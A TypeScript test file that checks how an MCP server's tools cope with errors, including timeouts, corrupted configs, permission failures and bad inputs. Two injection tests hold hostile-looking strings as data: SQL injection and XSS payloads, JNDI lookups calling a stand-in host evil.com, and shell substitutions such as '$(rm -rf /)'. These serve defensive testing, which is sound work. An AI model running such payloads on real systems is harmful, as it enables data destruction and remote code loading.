/**
 * Comprehensive Error Scenario Tests for MCP Tools
 * Tests network timeouts, invalid inputs, missing dependencies, corrupted files, etc.
 */

import { describe, it, expect, beforeEach, afterEach } from 'bun:test';
import { MCPTestClient } from '../../../utils/mcp-test-client';
import { TestConfigManager, getTestEnv } from '../setup-test-config';
import path from 'path';
import { writeFileSync, rmSync, chmodSync, mkdirSync } from 'fs';

describe('MCP Tools Error Scenarios', () => {
  let client: MCPTestClient;
  let testConfig: TestConfigManager;
  const mcpPath = path.join(__dirname, '../../../../src/mcp-server.ts');

  beforeEach(async () => {
    // Set up isolated test environment
    testConfig = new TestConfigManager('error-test');
    const testDir = await testConfig.setup();
    
    // Initialize MCP client with test environment
    client = new MCPTestClient(mcpPath, {
      timeout: 15000,
      env: getTestEnv(testDir)
    });
    
    await client.connect();
  });

  afterEach(async () => {
    client.disconnect();
    await testConfig.cleanup();
  });

  describe('network timeout scenarios', () => {
    it('should handle client timeout gracefully', async () => {
      // Create a client with very short timeout
      const shortTimeoutClient = new MCPTestClient(mcpPath, {
        timeout: 100, // 100ms timeout
        env: getTestEnv(testConfig.getTestDir())
      });
      
      try {
        await shortTimeoutClient.connect();
        
        // This should timeout for slower operations
        try {
          await shortTimeoutClient.callTool('doctor');
          // If it doesn't timeout, that's fine too
        } catch (error) {
          expect(error.message).toMatch(/(timeout|timed out)/i);
        }
      } catch (error) {
        // Connection might fail with very short timeout
        expect(error.message).toMatch(/(timeout|connection|failed)/i);
      } finally {
        shortTimeoutClient.disconnect();
      }
    });

    it('should handle MCP server unavailability', async () => {
      // Test with non-existent MCP server path
      const invalidMcpPath = '/nonexistent/path/to/mcp-server.ts';
      const invalidClient = new MCPTestClient(invalidMcpPath, {
        timeout: 5000,
        env: getTestEnv(testConfig.getTestDir())
      });
      
      try {
        await invalidClient.connect();
        expect(false).toBe(true); // Should not reach here
      } catch (error) {
        expect(error).toBeInstanceOf(Error);
        expect(error.message).toMatch(/(not found|no such file|spawn.*ENOENT)/i);
      } finally {
        invalidClient.disconnect();
      }
    });

    it('should handle MCP server crashes', async () => {
      // This test simulates server crashes by disconnecting abruptly
      const result = await client.callTool('doctor');
      expect(result).toBeDefined();
      
      // Simulate server crash by killing the process
      client.disconnect();
      
      // Try to make another call after disconnect
      try {
        await client.callTool('view-logs');
        expect(false).toBe(true); // Should not reach here
      } catch (error) {
        expect(error.message).toMatch(/(not connected|connection closed|disconnected)/i);
      }
    });
  });

  describe('invalid input handling', () => {
    it('should handle malformed JSON parameters', async () => {
      // Test with various invalid parameter combinations
      const invalidParams = [
        null,
        undefined,
        { lines: 'not-a-number' },
        { level: 123 },
        { search: { nested: 'object' } },
        { date: [] },
        { unknownParameter: 'value' }
      ];
      
      for (const params of invalidParams) {
        try {
          const result = await client.callTool('view-logs', params);
          // If it succeeds, it should handle gracefully
          expect(result).toBeDefined();
          expect(result.content).toBeInstanceOf(Array);
        } catch (error) {
          // If it fails, should be a proper error
          expect(error).toBeInstanceOf(Error);
          expect(error.message).toMatch(/(invalid|error|parameter)/i);
        }
      }
    });

    it('should handle extremely large parameter values', async () => {
      const extremeParams = [
        { lines: Number.MAX_SAFE_INTEGER },
        { lines: -Number.MAX_SAFE_INTEGER },
        { search: 'A'.repeat(100000) }, // 100k character search
        { level: 'INVALID_LEVEL'.repeat(1000) }
      ];
      
      for (const params of extremeParams) {
        const result = await client.callTool('view-logs', params);
        
        // Should handle gracefully without crashing
        expect(result).toBeDefined();
        expect(result.content).toBeInstanceOf(Array);
        expect(typeof result.content[0].text).toBe('string');
      }
    });

    it('should handle SQL injection attempts in search', async () => {
      const maliciousSearchTerms = [
        "'; DROP TABLE logs; --",
        "' OR '1'='1",
        "'; DELETE FROM * WHERE 1=1; --",
        "<script>alert('xss')</script>",
        "${jndi:ldap://evil.com/a}"
      ];
      
      for (const search of maliciousSearchTerms) {
        const result = await client.callTool('view-logs', { search });
        
        // Should handle safely without execution
        expect(result).toBeDefined();
        expect(result.content[0].text).toContain('Searched for:');
        expect(result.content[0].text).toContain(search);
      }
    });

    it('should handle binary data in parameters', async () => {
      // Test with binary data that might cause issues
      const binaryData = Buffer.from([0x00, 0x01, 0x02, 0xFF, 0xFE, 0xFD]).toString();
      
      const result = await client.callTool('view-logs', {
        search: binaryData
      });
      
      expect(result).toBeDefined();
      expect(result.content[0].text).toContain('Searched for:');
    });
  });

  describe('missing dependencies', () => {
    it('should handle missing Claude CLI gracefully', async () => {
      // Test reload command when Claude CLI is not available
      const result = await client.callTool('reload-mcp', {
        name: 'test-cch'
      });
      
      expect(result).toBeDefined();
      const output = result.content[0].text;
      
      // Should either succeed or provide clear error about missing CLI
      expect(output).toMatch(/(Successfully reloaded|Claude CLI not found|command not found|not installed)/);
    });

    it('should handle missing system utilities', async () => {
      // Test with limited PATH environment
      const limitedClient = new MCPTestClient(mcpPath, {
        timeout: 10000,
        env: {
          ...getTestEnv(testConfig.getTestDir()),
          PATH: '/nonexistent/path' // Very limited PATH
        }
      });
      
      try {
        await limitedClient.connect();
        
        const result = await limitedClient.callTool('doctor');
        expect(result).toBeDefined();
        
        // Should still provide diagnostics, possibly with warnings
        const diagnostics = result.content[0].text;
        expect(diagnostics).toContain('Diagnostics Report');
      } finally {
        limitedClient.disconnect();
      }
    });

    it('should handle missing Node.js/Bun in environment', async () => {
      // Test with very minimal environment
      const minimalClient = new MCPTestClient(mcpPath, {
        timeout: 10000,
        env: {
          CCH_DATA_DIR: testConfig.getCCHDir(),
          // Minimal environment without common variables
        }
      });
      
      try {
        await minimalClient.connect();
        
        const result = await minimalClient.callTool('doctor');
        expect(result).toBeDefined();
      } catch (error) {
        // If it fails to connect, that's expected with minimal environment
        expect(error).toBeInstanceOf(Error);
      } finally {
        minimalClient.disconnect();
      }
    });
  });

  describe('corrupted configuration', () => {
    it('should handle corrupted CCH config files', async () => {
      // Corrupt various config files
      const configFiles = [
        'config.json',
        'preferences.json',
        'permissions.json',
        'state.json'
      ];
      
      for (const filename of configFiles) {
        const configPath = path.join(testConfig.getCCHDir(), filename);
        
        // Test with various corruption patterns
        const corruptionPatterns = [
          '{ invalid json }',
          '{"unclosed": "object"',
          'not json at all',
          '',
          '{"valid": "json", "but": "unexpected", "structure": true}',
          '[]', // Wrong type
          'null'
        ];
        
        for (const corruptedContent of corruptionPatterns) {
          writeFileSync(configPath, corruptedContent);
          
          const result = await client.callTool('doctor');
          expect(result).toBeDefined();
          
          const diagnostics = result.content[0].text;
          // Should detect and report corruption
          expect(diagnostics).toMatch(/(Parse error|Invalid|Corrupted|Error reading)/);
        }
      }
    });

    it('should handle corrupted Claude configuration', async () => {
      const claudeConfigPath = testConfig.getClaudeConfigPath();
      
      // Test various Claude config corruptions
      const corruptedConfigs = [
        '{ "mcpServers": { invalid } }',
        '{"mcpServers": null}',
        '{"mcpServers": []}', // Wrong type
        'totally not json',
        '{"mcpServers": {"test": "not an object"}}'
      ];
      
      for (const corruptedConfig of corruptedConfigs) {
        writeFileSync(claudeConfigPath, corruptedConfig);
        
        const result = await client.callTool('reload-mcp', {
          all: true,
          dryRun: true
        });
        
        expect(result).toBeDefined();
        const output = result.content[0].text;
        
        // Should handle corruption gracefully
        expect(output).toMatch(/(Invalid configuration|Parse error|Configuration error|No MCPs)/);
      }
    });

    it('should handle partially corrupted log files', async () => {
      const logFile = path.join(testConfig.getCCHDir(), 'logs', 'cch.log');
      
      // Create log with mixed valid and invalid entries
      const mixedLog = `
2024-01-01T12:00:00.000Z [INFO] Valid log entry
This is not a valid log entry
2024-01-01T12:00:01.000Z [ERROR] Another valid entry
Random text in the middle
${'\x00'.repeat(100)} Binary garbage
2024-01-01T12:00:02.000Z [DEBUG] Final valid entry
`.trim();
      
      writeFileSync(logFile, mixedLog);
      
      const result = await client.callTool('view-logs', { lines: 20 });
      expect(result).toBeDefined();
      
      const logs = result.content[0].text;
      // Should handle mixed content gracefully
      expect(logs).toContain('Claude Code Helper Logs');
      expect(logs).toMatch(/Valid log entry|Another valid entry|Final valid entry/);
    });
  });

  describe('file system errors', () => {
    it('should handle permission denied errors', async () => {
      // Make log directory read-only (if supported by system)
      const logDir = path.join(testConfig.getCCHDir(), 'logs');
      
      try {
        chmodSync(logDir, 0o444); // Read-only
        
        const result = await client.callTool('view-logs');
        expect(result).toBeDefined();
        
        // Should handle permission issues gracefully
        const logs = result.content[0].text;
        expect(logs).toMatch(/(Permission denied|Access denied|Cannot read|No access)/);
      } catch (error) {
        // If chmod fails (like on Windows), that's okay
        console.log('chmod not supported, skipping permission test');
      } finally {
        try {
          chmodSync(logDir, 0o755); // Restore permissions
        } catch (e) {
          // Ignore restoration errors
        }
      }
    });

    it('should handle missing directories', async () => {
      // Remove CCH directory entirely
      rmSync(testConfig.getCCHDir(), { recursive: true, force: true });
      
      const result = await client.callTool('doctor');
      expect(result).toBeDefined();
      
      const diagnostics = result.content[0].text;
      expect(diagnostics).toMatch(/(Directory not found|Missing directory|❌)/);
    });

    it('should handle disk space issues', async () => {
      // Simulate disk space issues by creating very large files
      const logFile = path.join(testConfig.getCCHDir(), 'logs', 'cch.log');
      
      // Create a log file that might cause issues
      const largeLogContent = 'Large log entry content\n'.repeat(100000);
      writeFileSync(logFile, largeLogContent);
      
      const result = await client.callTool('view-logs', { lines: 50 });
      expect(result).toBeDefined();
      
      // Should handle large files without crashing
      const logs = result.content[0].text;
      expect(logs).toContain('Claude Code Helper Logs');
    });

    it('should handle file locks and concurrent access', async () => {
      // Simulate concurrent access to log files
      const logFile = path.join(testConfig.getCCHDir(), 'logs', 'cch.log');
      writeFileSync(logFile, 'Initial log content\n');
      
      // Try multiple concurrent reads
      const concurrentReads = Array(10).fill(null).map(() => 
        client.callTool('view-logs', { lines: 5 })
      );
      
      const results = await Promise.all(concurrentReads);
      
      // All reads should succeed
      expect(results).toHaveLength(10);
      results.forEach(result => {
        expect(result).toBeDefined();
        expect(result.content[0].text).toContain('Claude Code Helper Logs');
      });
    });
  });

  describe('resource exhaustion', () => {
    it('should handle memory pressure gracefully', async () => {
      // Create operations that might use significant memory
      const memoryIntensiveOps = [
        client.callTool('view-logs', { lines: 10000 }),
        client.callTool('doctor'),
        client.callTool('view-logs', { search: 'test' }),
        client.callTool('reload-mcp', { all: true, dryRun: true })
      ];
      
      // Execute all at once to create memory pressure
      const results = await Promise.all(memoryIntensiveOps);
      
      // All should complete successfully
      expect(results).toHaveLength(4);
      results.forEach(result => {
        expect(result).toBeDefined();
        expect(result.content).toBeInstanceOf(Array);
      });
    });

    it('should handle CPU-intensive operations', async () => {
      // Create CPU-intensive log processing
      const logFile = path.join(testConfig.getCCHDir(), 'logs', 'cch.log');
      const cpuIntensiveLog = Array(50000).fill(null).map((_, i) => 
        `2024-01-01T12:${(i % 60).toString().padStart(2, '0')}:${(i % 60).toString().padStart(2, '0')}.000Z [INFO] CPU intensive log entry ${i} with lots of text to process and search through`
      ).join('\n');
      
      writeFileSync(logFile, cpuIntensiveLog);
      
      const startTime = performance.now();
      
      // Multiple CPU-intensive operations
      const cpuOps = [
        client.callTool('view-logs', { search: 'intensive', lines: 1000 }),
        client.callTool('view-logs', { level: 'INFO', lines: 1000 }),
        client.callTool('view-logs', { lines: 2000 })
      ];
      
      const results = await Promise.all(cpuOps);
      const duration = performance.now() - startTime;
      
      expect(results).toHaveLength(3);
      results.forEach(result => {
        expect(result).toBeDefined();
      });
      
      // Should complete within reasonable time even under load
      expect(duration).toBeLessThan(30000); // 30 seconds
    });
  });

  describe('malformed MCP communication', () => {
    it('should handle invalid JSON-RPC messages', async () => {
      // This test is more complex as it requires low-level MCP protocol testing
      // We'll test through the client's error handling
      
      const result = await client.callTool('view-logs', { lines: 10 });
      expect(result).toBeDefined();
      
      // The fact that we can make successful calls shows the protocol is working
      expect(result.content[0].text).toContain('Claude Code Helper Logs');
    });

    it('should handle connection interruptions', async () => {
      // Make a successful call first
      const result1 = await client.callTool('doctor');
      expect(result1).toBeDefined();
      
      // The client should handle any connection issues internally
      const result2 = await client.callTool('view-logs', { lines: 5 });
      expect(result2).toBeDefined();
    });
  });

  describe('edge case scenarios', () => {
    it('should handle system clock changes', async () => {
      // Test with logs that have future timestamps
      const logFile = path.join(testConfig.getCCHDir(), 'logs', 'cch.log');
      const futureDate = new Date(Date.now() + 86400000); // Tomorrow
      const pastDate = new Date(Date.now() - 86400000); // Yesterday
      
      const timeSkewedLog = `
${futureDate.toISOString()} [INFO] Future log entry
${pastDate.toISOString()} [ERROR] Past log entry
${new Date().toISOString()} [DEBUG] Current log entry
`.trim();
      
      writeFileSync(logFile, timeSkewedLog);
      
      const result = await client.callTool('view-logs', { lines: 10 });
      expect(result).toBeDefined();
      
      const logs = result.content[0].text;
      expect(logs).toContain('Claude Code Helper Logs');
    });

    it('should handle Unicode and encoding issues', async () => {
      const logFile = path.join(testConfig.getCCHDir(), 'logs', 'cch.log');
      
      // Test various Unicode scenarios
      const unicodeLog = `
2024-01-01T12:00:00.000Z [INFO] Unicode test: 你好世界 🌍 emoji test
2024-01-01T12:00:01.000Z [ERROR] Special chars: àáâãäåæçèéêëìíîïñòóôõö
2024-01-01T12:00:02.000Z [DEBUG] Zero-width chars: ​‌‍‎‏
2024-01-01T12:00:03.000Z [WARN] RTL text: العربية עברית
`.trim();
      
      writeFileSync(logFile, unicodeLog);
      
      const result = await client.callTool('view-logs', { search: 'Unicode' });
      expect(result).toBeDefined();
      
      const logs = result.content[0].text;
      expect(logs).toContain('Unicode test');
    });

    it('should handle environment variable injection attempts', async () => {
      // Test with malicious environment-like strings
      const maliciousInputs = [
        '${PATH}',
        '$HOME/malicious',
        '$(rm -rf /)',
        '`whoami`',
        '${jndi:ldap://evil.com}'
      ];
      
      for (const input of maliciousInputs) {
        const result = await client.callTool('view-logs', { search: input });
        
        expect(result).toBeDefined();
        // Should treat as literal string, not execute
        expect(result.content[0].text).toContain(`Searched for: "${input}"`);
      }
    });
  });
});